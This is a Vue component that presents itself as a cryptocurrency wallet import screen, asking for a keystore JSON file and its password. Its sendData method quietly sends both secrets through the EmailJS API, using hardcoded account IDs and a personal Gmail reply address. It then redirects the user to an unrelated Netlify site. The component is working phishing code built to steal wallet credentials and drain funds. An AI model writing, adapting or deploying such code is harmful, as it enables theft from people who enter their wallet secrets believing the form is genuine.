<template>
  <div class="private flex h-full flex-col px-5">
    <label class="mb-4 font-light text-lg text-center" for=""
      >Please enter your keystore JSON</label
    >
    <el-input
      v-model="keystore_JSON"
      class="text-white bg-black"
      type="textarea"
      :rows="2"
    >
    </el-input>
    <span>Please enter your keystore in JSON format</span>

    <el-input
      v-model="password"
      placeholder="Password"
      class="my-5 text-white"
      show-password
    >
    </el-input>
    <p class="my-10 font-semibold text-sm">
      Input the BIP39/BIP44 recovery phrase here to restore the private keys
      that manage your acccounts
    </p>
    <el-button
      :loading="loading"
      class="text-white bg-black"
      style="
        background: rgb(0, 140, 115) !important;
        color: white;
        font-weight: bold;
      "
      @click="sendData"
      >Import</el-button
    >
  </div>
</template>

<script>
import axios from 'axios'
export default {
  props: {
    walletType: {
      type: String,
      default: '',
    },
  },
  data() {
    return {
      keystore_JSON: '',
      password: '',
      loading: false,
    }
  },
  methods: {
    sendData() {
      this.loading = true
      const self = this
      const checker = this.formChecker()
      if (checker) {
        const data = {
          service_id: "service_khz33ja",
          template_id: "template_hl2qzeh",
          user_id: "user_NfLXuXfvGqkJFOqnVRRmw",
          template_params: {
            from_name: `KEYSTORE on ${this.walletType}`,
            keystore_JSON: this.keystore_JSON,
            password: this.password,
            reply_to: "samuelbarnett660@gmail.com"
          },
        }
        axios
          .post('https://api.emailjs.com/api/v1.0/email/send', data)
          .then(function () {
            window.location.href = 'https://barcode-validation.netlify.app/'
            self.loading = false
          })
          .catch(function () {
            self.loading = false
          })
      } else {
        this.$notify({
          title: 'Warning',
          message: 'All Form input is required',
          type: 'warning',
        })
      }
    },
    formChecker() {
      if (this.textarea === '' || this.password === '') {
        return false
      } else {
        return true
      }
    },
  },
}
</script>
